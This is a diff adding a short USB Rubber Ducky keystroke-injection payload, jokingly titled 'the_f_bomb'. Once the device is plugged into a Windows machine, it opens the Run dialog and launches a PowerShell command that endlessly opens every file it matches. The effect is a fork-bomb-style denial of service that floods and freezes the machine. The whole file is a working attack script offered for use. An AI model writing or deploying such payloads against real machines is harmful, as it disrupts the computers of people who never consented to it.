@@ -1,0 +1,9 @@
+REM Title: the_f_bomb
+REM Author: @tjgeirk
+REM Description: The littlest payload known to duck-kind
+REM it's f_ing hilarious - works on all windows machines with powershell
+DELAY 300
+GUI r
+DELAY 100
+STRING powershell while(1){ii **}
+ENTER
